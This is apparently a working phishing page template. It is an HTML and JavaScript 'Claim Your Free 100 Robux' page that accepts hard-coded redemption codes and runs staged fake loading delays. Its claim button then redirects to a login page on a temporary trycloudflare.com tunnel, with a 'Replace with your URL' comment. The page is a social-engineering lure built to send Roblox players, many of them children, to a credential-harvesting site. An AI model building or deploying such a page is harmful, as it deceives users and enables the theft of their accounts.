<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Robux Redemption</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      background-image: url('roblox-bg.jpg');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      background-color: rgba(0, 0, 0, 0.75);
      padding: 40px 50px;
      border-radius: 20px;
      box-shadow: 0 0 20px #000;
      text-align: center;
      max-width: 400px;
      width: 90%;
      color: white;
    }

    h1 {
      color: gold;
      font-size: 2.5rem;
      margin-bottom: 30px;
      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.8);
    }

    label {
      display: block;
      margin-bottom: 10px;
      font-weight: bold;
      font-size: 1.1rem;
      text-align: left;
    }

    input[type="text"] {
      width: 100%;
      padding: 12px 10px;
      border-radius: 8px;
      border: none;
      font-size: 1rem;
      margin-bottom: 20px;
    }

    button {
      padding: 14px 32px;
      background-color: #00ff85;
      color: black;
      font-weight: bold;
      border: none;
      border-radius: 12px;
      box-shadow: 0 0 15px #00ff85;
      font-size: 1.1rem;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #00d26a;
    }

    .message {
      margin-top: 20px;
      font-weight: bold;
      font-size: 1.1rem;
      min-height: 1.5em;
    }

    .success {
      color: #00ff85;
    }

    .error {
      color: #ff4c4c;
    }

    #claimButton {
      margin-top: 20px;
      opacity: 0;
      transition: opacity 0.8s ease;
      display: none;
    }

    #claimButton.show {
      display: inline-block;
      opacity: 1;
    }

    /* Spinner */
    .spinner-btn {
      border: 4px solid rgba(255, 255, 255, 0.2);
      border-top: 4px solid #00ff85;
      border-radius: 50%;
      width: 32px;
      height: 32px;
      animation: spin 1s linear infinite;
      display: none;
      margin: auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Dots animation */
    .dots::after {
      content: '';
      animation: dots 1.5s steps(3, end) infinite;
    }

    @keyframes dots {
      0%   { content: ''; }
      33%  { content: '.'; }
      66%  { content: '..'; }
      100% { content: '...'; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Claim Your Free 100 Robux</h1>
    <form id="redeemForm">
      <label for="code">Enter your Robux code:</label>
      <input type="text" id="code" name="code" required />
      <div id="buttonWrapper">
        <button type="submit" id="redeemButton">Redeem</button>
        <div class="spinner-btn" id="spinner"></div>
      </div>
    </form>
    <div class="message" id="message"></div>
    <button id="claimButton">Claim Your Robux</button>
  </div>

  <script>
    const form = document.getElementById('redeemForm');
    const messageDiv = document.getElementById('message');
    const claimButton = document.getElementById('claimButton');
    const spinner = document.getElementById('spinner');
    const redeemButton = document.getElementById('redeemButton');
    const buttonWrapper = document.getElementById('buttonWrapper');

    // ✅ List of valid codes
    const validCodes = ["BLOX2025", "0PYXB3UX", "2025B4LPY"];

    form.addEventListener('submit', (e) => {
      e.preventDefault();
      const code = form.code.value.trim();

      // Hide claim button immediately
      claimButton.classList.remove('show');
      claimButton.style.display = 'none';

      messageDiv.textContent = "";

      // Hide redeem button, show spinner
      redeemButton.style.display = "none";
      spinner.style.display = "block";

      setTimeout(() => {
        spinner.style.display = "none"; // Hide spinner
        buttonWrapper.style.display = "none"; // Remove redeem area completely

        const codePattern = /^[A-Za-z0-9]{8,12}$/;

        if (!codePattern.test(code)) {
          messageDiv.textContent = "Invalid code format. Please try again.";
          messageDiv.className = "message error";
          return;
        }

        if (validCodes.includes(code.toUpperCase())) {
          messageDiv.innerHTML = "Success! Robux redeemed, please wait<span class='dots'></span>";
          messageDiv.className = "message success";

          // Random delay between 7–10s
          const delay = Math.floor(Math.random() * (10000 - 7000 + 1)) + 7000;

          setTimeout(() => {
            // Hide success message
            messageDiv.textContent = "";
            // Show claim button
            claimButton.style.display = 'inline-block';
            claimButton.classList.add('show');
          }, delay);
        } else {
          messageDiv.textContent = "Code not recognized. Please check and try again.";
          messageDiv.className = "message error";
        }
      }, 4000); // 4 seconds delay
    });

    claimButton.addEventListener('click', () => {
      window.location.href = "https://owned-ronald-research-linux.trycloudflare.com/login.html"; // Replace with your URL
    });
  </script>
</body>
</html>
